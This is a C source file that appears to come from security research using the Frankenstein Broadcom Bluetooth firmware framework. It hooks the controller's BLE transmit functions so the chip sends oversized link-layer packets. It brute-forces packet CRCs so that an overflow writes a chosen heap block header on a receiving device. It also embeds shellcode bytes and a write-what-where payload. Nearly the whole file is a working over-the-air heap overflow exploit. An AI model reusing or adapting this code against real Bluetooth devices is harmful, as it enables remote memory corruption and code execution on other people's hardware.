#include <string.h>

#include <frankenstein/BCMBT/patching/patchram.h>
#include <frankenstein/BCMBT/patching/hciio.h>
#include <frankenstein/hook.h>

void bcsulp_fillTxBuffer();
void bcsulp_progTxBuffer();

//#define HDR 0xff16
#define HDR_SN0 0xff16
#define HDR_SN1 0xff1a

uint32_t sn0_fix, sn1_fix;

#define shellcode "\xdf\xf8\x04\xe0\xdf\xf8\x00\xf0\x37\x13\xad\xde"

//s10e virtual functions
//#define write_where 0x9a054
//#define write_where 0x41424344
#define write_where (0xdadadada+4)
#define bloc_hdr (write_where-4)

/*
struct eval_board_payload {
    char scode[12];
    int func_ptrs[60];    //spray the rest of the buffer with our target pointers
} write_what = {.scode=shellcode, .func_ptrs={
    write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1,
    write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1,
    write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1,
    write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1,
    write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1,
    write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1, write_where|1,
    write_where|1, write_where|1, write_where|1, write_where|1,
}};
*/
char write_what[] = "\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda\xda";


unsigned char reverse_bit(unsigned char b) {
    b = (b & 0xF0) >> 4 | (b & 0x0F) << 4;
    b = (b & 0xCC) >> 2 | (b & 0x33) << 2;
    b = (b & 0xAA) >> 1 | (b & 0x55) << 1;
    return b;
}


//taken from https://dmitry.gr/index.php?r=05.Projects&proj=11.%20Bluetooth%20LE%20fakery
void btLeCrc(const uint8_t* data, int len, uint8_t* dst){
    uint8_t v, t, d;

    while(len--){
        d = *data++;
        for(v = 0; v < 8; v++, d >>= 1){
            t = dst[0] >> 7;

            dst[0] <<= 1;
            if(dst[1] & 0x80) dst[0] |= 1;
            dst[1] <<= 1;
            if(dst[2] & 0x80) dst[1] |= 1;
            dst[2] <<= 1;

            if(t != (d & 1)){
                dst[2] ^= 0x5B;
                dst[1] ^= 0x06;
            }
        }
    }
}

uint32_t adapt_crc(uint32_t hdr) {
    uint32_t crc, crc_test;
    int i;
    uint32_t *writhe_what_32 = (uint32_t *)&write_what;

    //crc IV
    crc = *(uint32_t *)0x318ba4; //wib_conn_lfsr
    crc = ((crc>>16) & 0x0000ff) | (crc & 0x00ff00) | ((crc<<16) & 0xff0000);

    btLeCrc((uint8_t *)&hdr, 2, (uint8_t*)&crc);                //Compute chekcsum over header
    btLeCrc((uint8_t *)writhe_what_32, 248, (uint8_t *)&crc);   //Update checksum over first
                                                                //248 bytes of packet data

    writhe_what_32[63] = bloc_hdr;  //set our target overflow value
    //find a matching packet suffix in order
    //to overflow with a correct fourth byte
    while (1) {
        crc_test = crc;
        btLeCrc((uint8_t *)(&writhe_what_32[62]), 3+4, (uint8_t *)&crc_test);   //compute CRC over
                                                                                //packet suffix
        //check the CRC and try next value
        if ((reverse_bit(crc_test & 0xff) & 0xff) == (bloc_hdr>>24) & 0xff) break;
        writhe_what_32[62] ++;
    }
    return writhe_what_32[62];
}



int active_tx_buffer;
int I = 0;
void bcsulp_progTxBuffer_pre( struct saved_regs * regs , void * arg ){
    active_tx_buffer = regs->r0;
}


int clock_SystemTimeMicroseconds32_nolock();
uint32_t bcsulp_progTxBuffer_post( uint32_t retval, void *_) {
    //if (overflowed) { *(( int *) 0x318b68 ) ^= 1 << (rand()%32); *(( int *) 0x318b68 ) ^= 1 << (rand()%32); return;}
    //*(( int *) 0x318b68 ) &= 0xffff0000 ; // wib_tx_pyld_info
    //*(( int *) 0x318b68 ) |= HDR;

    /*
    if (I++>8) {
        *(( int *) 0x318b68 ) |= 0xff12ff12;
        *(( int *) 0x318b68 ) &= ~0x00010001;
     }
     return;
     */
    I ++;
    if (I==8){
        sn1_fix = adapt_crc(HDR_SN1);
        sn0_fix = adapt_crc(HDR_SN0);
    }


    int hdr = 0xffff & ( (*(( int *) 0x318b68 )) >> (active_tx_buffer*16));
    if(I > 32) {
        *(( int *) 0x318b68 ) &= ~(0xffff << (active_tx_buffer*16));

        if (hdr & 0x0008) { //check current SN
            *(( int *) 0x318b68 ) |= HDR_SN1 << (active_tx_buffer*16);

            //Fix CRC
            if (active_tx_buffer == 0)
                ((uint32_t*)0x370800)[62] = sn1_fix;
            else
                ((uint32_t*)0x370a00)[62] = sn1_fix;


        } else {
            *(( int *) 0x318b68 ) |= HDR_SN0 << (active_tx_buffer*16);

            //Fix CRC
            if (active_tx_buffer == 0)
                ((uint32_t*)0x370800)[62] = sn0_fix;
            else
                ((uint32_t*)0x370a00)[62] = sn0_fix;

        }
    }


    /***************************************************************************
    if (I>32) {
        *(( int *) 0x318b68 ) |= 0xff12ff12;
        *(( int *) 0x318b68 ) &= ~0x00010001;
        //*(( int *) 0x318b68 ) ^= ~0x00010001 & (*(( int *) 0x318b68) >> 1);
    }
    //if (I < 2048) ringbuff[I++] = active_tx_buffer;//*(( int *) 0x318b68 );
    int hdr = 0xffff & ( (*(( int *) 0x318b68 )) >> (active_tx_buffer*16) );


    if (I < 2048){
        ringbuff[I++] = hdr;
        if(active_tx_buffer){
            ringbuff[I++] = *(( int *) 0x370A00 );
            ringbuff[I++] = *(( int *) 0x370A04 );
        }else{
            ringbuff[I++] = *(( int *) 0x370800 );
            ringbuff[I++] = *(( int *) 0x370804 );
        }
        ringbuff[I++] = clock_SystemTimeMicroseconds32_nolock();
    }
    ***************************************************************************/

    //if ((overflowed % 2) == 0) {
        //*(( int *) 0x318b68 ) &= 0xffff0000 ; // wib_tx_pyld_info
        //*(( int *) 0x318b68 ) |= HDR;
        //*(( int *) 0x318b68 ) = 0xff16ff16;
        //*(( int *) 0x318b68 ) |= 0x00100010;
        //*(( int *) 0x318b68 ) |= 0x01000100;

        //*(( int *) 0x318b68 ) |= 0x10001000;
    //*(( int *) 0x318b68 ) ^= rand() & 0x0f130f13;
    /*
        if ((hdr&0x3) == 3) {
            int x = *(( int *) 0x370800 );
            //if ((x&0xff) == 0x15) {
            //    if (I < 2048) ringbuff[I++] = x;
            //    *(( int *) 0x370800) = 0xffffff15;
            *(( int *) 0x370800) = rand();

            //}
            //*(( int *) 0x318b68 ) |= 0x1f001f00;
            //*(( int *) 0x318b68 ) ^= rand() & 0x01030103;

            hdr|=0xff00;
        }
        */
        //if ((hdr&0x3) == 1) {

        //if (I==32) *(( int *) 0x318b68 ) == 0xff00ff00;
        //if (I < 2048) ringbuff[I++] = hdr;
        //*(( int *) 0x318b68 ) ^= (rand()&0x10001)<<4;
        //*(( int *) 0x318b68 ) ^= (rand()&0x10001)<<8;
        //*(( int *) 0x370800 ) ^= rand();
    //}

    return *(( int *) 0x318b68 );
}

void fill_tx_buffer_pre( struct saved_regs * regs , void * arg ) {
    uint32_t *writhe_what_32 = (uint32_t *)&write_what;
    if(I > 32) { //delay until some packet
        regs->r1 = (uint32_t)writhe_what_32;
        regs->r2 = 0xff;
    }
}

void bcsulp_connTaskCreate(void *);
void bcsulp_connTaskCreate_hook( struct saved_regs * regs , void * arg ) {
    print("connect\n");
    I = 0;
    sn1_fix = adapt_crc(HDR_SN1);
    sn0_fix = adapt_crc(HDR_SN0);
}
void bcsulp_connTaskDelete(void *);
void bcsulp_connTaskDelete_hook( struct saved_regs * regs , void * arg ) {
    print("disconnect\n");
}



/****************************************
Setup the exploit
****************************************/
int exploit_setup_done = 0;
void _start() {
    if (exploit_setup_done) return;
    exploit_setup_done = 1;

    add_hook(bcsulp_fillTxBuffer , fill_tx_buffer_pre , NULL, NULL );
    add_hook(bcsulp_progTxBuffer , bcsulp_progTxBuffer_pre, bcsulp_progTxBuffer_post , NULL );
    add_hook(bcsulp_connTaskCreate, bcsulp_connTaskCreate_hook, NULL, NULL);
    add_hook(bcsulp_connTaskDelete, bcsulp_connTaskDelete_hook, NULL, NULL);
}

